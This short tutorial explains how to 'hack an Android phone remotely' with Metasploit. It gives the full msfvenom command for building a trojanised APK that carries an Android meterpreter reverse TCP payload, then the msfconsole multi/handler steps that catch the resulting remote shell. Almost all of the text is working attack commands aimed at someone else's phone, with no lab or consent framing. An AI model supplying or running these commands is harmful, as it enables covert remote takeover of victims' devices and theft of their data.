Hacking Android phone remotely using Metasploit

Step 1: Open your Kali Linux or other Linux system (Must have Metasploit installed). Open your Terminal and type in the following command:

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 > app.apk

Step 2: Open up a new terminal and use the following command to start Metasploit framework.

msfconsole

Step 3: Now in the Metasploit framework console type the following command:

use exploit/multi/handler

Step 4: Set payload using following command:

set payload android/meterpreter/reverse_tcp

Then set your LHOST:

set LHOST 192.168.100.10

Then set your LPORT:

set LPORT 4444

Then type following command to start:

exploit
